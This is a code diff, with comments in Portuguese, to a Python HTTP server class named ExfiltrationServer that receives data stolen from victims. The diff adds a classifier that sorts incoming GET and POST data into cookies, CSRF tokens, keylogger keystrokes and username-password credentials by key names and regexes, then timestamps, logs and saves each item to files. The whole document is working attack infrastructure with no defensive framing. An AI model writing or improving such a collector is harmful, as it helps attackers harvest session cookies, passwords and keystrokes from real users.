@@ -1,7 +1,31 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import logging
 import json
+import re
 from urllib.parse import urlparse, parse_qs
+from datetime import datetime
+
+# Função para identificar o tipo de dado
+def identify_data(data):
+    if isinstance(data, dict):
+        # Checagem por chaves específicas em JSON
+        if "cookies" in data:
+            return "cookies"
+        elif "csrf_token" in data:
+            return "csrf_tokens"
+        elif "key" in data:
+            return "keylogger"
+        elif "username" in data and "password" in data:
+            return "credentials"
+    else:
+        # Checagem de padrões para strings
+        if re.search(r"session=|cookie=", data):
+            return "cookies"
+        elif re.match(r'[a-zA-Z0-9]{32,}', data):
+            return "csrf_tokens"
+        elif re.search(r".+@.+\..+:.+", data):
+            return "credentials"
+    return "other"
 
 # Função para salvar dados organizadamente
 def save_data(data_type, data):
@@ -14,7 +38,7 @@ def save_data(data_type, data):
         existing_data = []
 
     # Adicionar os novos dados
-    existing_data.append(data)
+    existing_data.append({"timestamp": datetime.now().isoformat(), "data": data})
 
     # Salvar novamente no arquivo
     with open(filename, "w") as file:
@@ -34,16 +58,11 @@ class ExfiltrationServer(BaseHTTPRequestHandler):
         parsed_url = urlparse(self.path)
         params = parse_qs(parsed_url.query)
 
-        # Identificar tipo de dado (baseado nos parâmetros recebidos)
-        if "cookies" in params:
-            save_data("cookies", params["cookies"][0])
-            logging.info(f"Cookies captured: {params['cookies'][0]}")
-        elif "csrf_token" in params:
-            save_data("csrf_tokens", params["csrf_token"][0])
-            logging.info(f"CSRF Token captured: {params['csrf_token'][0]}")
-        else:
-            save_data("other", params)
-            logging.info(f"Other Data captured: {params}")
+        # Processar os parâmetros e salvar os dados
+        for key, value in params.items():
+            data_type = identify_data({key: value[0]})
+            save_data(data_type, {key: value[0]})
+            logging.info(f"Captured {data_type}: {value[0]}")
 
         # Responder ao cliente
         self.send_response(200)
@@ -56,35 +75,22 @@ class ExfiltrationServer(BaseHTTPRequestHandler):
         # Extrair conteúdo do corpo da requisição
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length).decode('utf-8')
+        logging.info(f"Raw POST data received: {post_data}")
 
-        # Processar os dados recebidos no corpo
+        # Identificar tipo de dado e salvar
         try:
-            # Verificar se é JSON
+            # Tentar interpretar como JSON
             data = json.loads(post_data)
-            if "key" in data:  # Identificar keylogger
-                save_data("keylogger", data)
-                logging.info(f"Keylogger data received: {data}")
-            elif "cookies" in data:
-                save_data("cookies", data["cookies"])
-                logging.info(f"Cookies captured via POST: {data['cookies']}")
-            elif "csrf_token" in data:
-                save_data("csrf_tokens", data["csrf_token"])
-                logging.info(f"CSRF Token captured via POST: {data['csrf_token']}")
-            else:
-                save_data("other", data)
-                logging.info(f"Other Data captured via POST: {data}")
+            data_type = identify_data(data)
+            save_data(data_type, data)
+            logging.info(f"Captured {data_type}: {data}")
         except json.JSONDecodeError:
             # Caso não seja JSON, processa como form-urlencoded
             parsed_data = parse_qs(post_data)
-            if "cookies" in parsed_data:
-                save_data("cookies", parsed_data["cookies"][0])
-                logging.info(f"Cookies captured via POST: {parsed_data['cookies'][0]}")
-            elif "csrf_token" in parsed_data:
-                save_data("csrf_tokens", parsed_data["csrf_token"][0])
-                logging.info(f"CSRF Token captured via POST: {parsed_data['csrf_token'][0]}")
-            else:
-                save_data("other", parsed_data)
-                logging.info(f"Other Data captured via POST: {parsed_data}")
+            for key, value in parsed_data.items():
+                data_type = identify_data({key: value[0]})
+                save_data(data_type, {key: value[0]})
+                logging.info(f"Captured {data_type} (form-encoded): {value[0]}")
 
         # Responder ao cliente
         self.send_response(200)
